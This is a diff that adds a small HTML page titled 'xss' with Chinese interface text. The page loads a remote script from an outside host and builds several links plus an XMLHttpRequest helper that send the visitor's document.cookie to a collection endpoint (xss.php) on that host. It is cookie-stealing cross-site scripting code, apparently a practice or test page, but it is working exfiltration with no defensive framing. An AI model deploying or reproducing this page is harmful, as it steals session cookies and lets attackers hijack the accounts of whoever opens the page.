@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>xss</title>
+   <script src="http://www.qiupan.site/js/t.js"></script>
+</head>
+<body>
+    <h1>hello ad</h1>
+    <a href="javascript:h()">xss1</a>
+    <a href="javascript:location.href='http://www.qiupan.site/xss.php?'+document.cookie">xss2</a>
+    <a id="d">xss3</a>
+    <button onclick="a()">点我哦啊</button>
+    <a href="/next">下一页</a><a href="/pre">上一页</a>
+<script type="application/javascript">
+    var u="http://www.qiupan.site/xss.php?"+document.cookie;
+    h=function(){
+        //var u="http://www.qiupan.site/xss.php?"+document.cookie;
+        Ajax("GET",u);
+    }
+    Ajax=function(method,url){
+        var xhr;
+        if(window.XMLHttpRequest){
+            xhr=new XMLHttpRequest();//IE7+,firefox,chrome
+        }else{
+            xhr=new ActiveXObject('Microsoft.XMLHttpRequest');
+        }
+        xhr.onreadystatechange==function(){
+            if(xhr.readyState==4&&xhr.status==200){
+                //访问成功的操作
+                //fn.call(xhr.response);
+                alert("success");
+            }
+        }
+        xhr.param={
+            "Cookie":'cookie'
+        }
+        xhr.open(method,url);
+        xhr.send();
+    }
+    var a1=document.querySelector("#d");
+    a1.setAttribute("href",u);
+</script>
+</body>
+</html>
